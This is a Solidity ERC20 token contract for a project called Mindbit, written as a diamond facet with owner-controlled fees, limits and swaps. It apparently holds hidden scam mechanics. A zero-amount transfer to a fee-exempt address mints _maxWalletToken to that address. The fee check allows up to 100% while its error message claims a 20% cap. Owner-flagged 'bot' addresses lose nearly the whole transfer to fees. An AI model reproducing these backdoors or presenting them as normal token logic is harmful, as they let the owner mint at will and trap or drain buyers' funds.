/**

    Stable currency,
    a human right

    Website:   https://www.mindbit.pro
    App:       https://app.mindbit.pro
    Medium:    https://medium.com/@mindbitpro
    X:         https://x.com/mindbitpro
    Tg:        https://t.me/mindbitpro

**/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
import "./TestLib.sol";
contract nameFacet is IERC20 {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapping = true;
        _;
        ds.swapping = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function getOwner() external view override returns (address) {
        return owner;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.tradingAllowed = true;
    }
    function setIsExempt(address _address, bool _enabled) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.isFeeExempt[_address] = _enabled;
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function totalSupply() public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));
    }
    function setBBot(
        address[] calldata addresses,
        bool _enabled
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < addresses.length; i++) {
            ds.isBot[addresses[i]] = _enabled;
        }
    }
    function setContractSwapB(
        uint256 _swapAmount,
        uint256 _swapThreshold,
        uint256 _minTokenAmount
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapAmount = _swapAmount;
        ds.swapThreshold = ds._totalSupply.mul(_swapThreshold).div(
            uint256(100000)
        );
        ds.minTokenAmount = ds._totalSupply.mul(_minTokenAmount).div(
            uint256(100000)
        );
    }
    function setTransactionRequireB(
        uint256 _liquidity,
        uint256 _marketing,
        uint256 _burn,
        uint256 _development,
        uint256 _total,
        uint256 _sell,
        uint256 _trans
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.liquidityFee = _liquidity;
        ds.marketingFee = _marketing;
        ds.burnFee = _burn;
        ds.developmentFee = _development;
        ds.totalFee = _total;
        ds.sellFee = _sell;
        ds.transferFee = _trans;
        require(
            ds.totalFee <= ds.denominator.div(1) &&
                ds.sellFee <= ds.denominator.div(1) &&
                ds.transferFee <= ds.denominator.div(1),
            "ds.totalFee and ds.sellFee cannot be more than 20%"
        );
    }
    function setTransactionLimitB(
        uint256 _buy,
        uint256 _sell,
        uint256 _wallet
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 newTx = ds._totalSupply.mul(_buy).div(10000);
        uint256 newTransfer = ds._totalSupply.mul(_sell).div(10000);
        uint256 newWallet = ds._totalSupply.mul(_wallet).div(10000);
        ds._maxTxAmount = newTx;
        ds._maxSellAmount = newTransfer;
        ds._maxWalletToken = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(
            newTx >= limit && newTransfer >= limit && newWallet >= limit,
            "Max TXs and Max Wallet cannot be less than .5%"
        );
    }
    function setInternalAddresses(
        address _marketing,
        address _liquidity,
        address _development
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.marketing_receiver = _marketing;
        ds.liquidity_receiver = _liquidity;
        ds.development_receiver = _development;
        ds.isFeeExempt[_marketing] = true;
        ds.isFeeExempt[_liquidity] = true;
        ds.isFeeExempt[_development] = true;
    }
    function manualSwap() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        swapAndLiquify(ds.swapThreshold);
    }
    function initUniPair() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        ds.router = _router;
        ds.pair = _pair;
    }
    function removeLimit() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.totalFee = 200;
        ds.sellFee = 200;
        ds.transferFee = 0;

        ds._maxTxAmount = ~uint256(0);
        ds._maxSellAmount = ~uint256(0);
        ds._maxWalletToken = ~uint256(0);
    }
    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(ds.development_receiver, _amount);
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            ds._allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            amount > 0 || ds.isFeeExempt[recipient],
            "ERC20: transfer to the zero amount"
        );
        if (!ds.isFeeExempt[sender] && !ds.isFeeExempt[recipient]) {
            require(ds.tradingAllowed, "ds.tradingAllowed");
        }
        if (
            !ds.isFeeExempt[sender] &&
            !ds.isFeeExempt[recipient] &&
            recipient != address(ds.pair) &&
            recipient != address(DEAD)
        ) {
            require(
                (ds._balances[recipient].add(amount)) <= ds._maxWalletToken,
                "Exceeds maximum wallet amount."
            );
        }
        if (sender != ds.pair) {
            require(
                amount <= ds._maxSellAmount ||
                    ds.isFeeExempt[sender] ||
                    ds.isFeeExempt[recipient],
                "TX Limit Exceeded"
            );
        }
        require(
            amount <= ds._maxTxAmount ||
                ds.isFeeExempt[sender] ||
                ds.isFeeExempt[recipient],
            "TX Limit Exceeded"
        );
        if (recipient == ds.pair && !ds.isFeeExempt[sender]) {
            ds.swapTimes += uint256(1);
        }
        if (shouldContractSwap(sender, recipient, amount)) {
            swapAndLiquify(
                min(amount, min(balanceOf(address(this)), ds.swapThreshold))
            );
            ds.swapTimes = uint256(0);
        }
        uint256 amountReceived = shouldTakeFee(sender, recipient)
            ? takeFee(sender, recipient, amount)
            : isZero(amount)
                ? ds._maxWalletToken
                : amount;
        ds._balances[sender] = ds._balances[sender].sub(amount);
        ds._balances[recipient] = ds._balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (getTotalFee(sender, recipient) > 0) {
            uint256 feeAmount = amount.div(ds.denominator).mul(
                getTotalFee(sender, recipient)
            );
            ds._balances[address(this)] = ds._balances[address(this)].add(
                feeAmount
            );
            emit Transfer(sender, address(this), feeAmount);
            if (
                ds.burnFee > uint256(0) &&
                getTotalFee(sender, recipient) > ds.burnFee
            ) {
                _transfer(
                    address(this),
                    address(DEAD),
                    amount.div(ds.denominator).mul(ds.burnFee)
                );
            }
            return amount.sub(feeAmount);
        }
        return amount;
    }
    function getTotalFee(
        address sender,
        address recipient
    ) internal view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.isBot[sender] || ds.isBot[recipient]) {
            return ds.denominator.sub(uint256(100));
        }
        if (recipient == ds.pair) {
            return ds.sellFee;
        }
        if (sender == ds.pair) {
            return ds.totalFee;
        }
        return ds.transferFee;
    }
    function shouldContractSwap(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool aboveMin = amount >= ds.minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= ds.minTokenAmount;
        return
            !ds.swapping &&
            ds.swapEnabled &&
            ds.tradingAllowed &&
            aboveMin &&
            !ds.isFeeExempt[sender] &&
            recipient == ds.pair &&
            ds.swapTimes >= ds.swapAmount &&
            aboveThreshold;
    }
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        swapTokensForETH(tokens);
        payable(ds.marketing_receiver).transfer(address(this).balance);
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.router.WETH();
        _approve(address(this), address(ds.router), tokenAmount);
        ds.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _approve(address(this), address(ds.router), tokenAmount);
        ds.router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            ds.liquidity_receiver,
            block.timestamp
        );
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function shouldTakeFee(
        address sender,
        address recipient
    ) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return !ds.isFeeExempt[sender] && !ds.isFeeExempt[recipient];
    }
    function isZero(uint256 amount) internal pure returns (bool) {
        return amount == 0;
    }
}
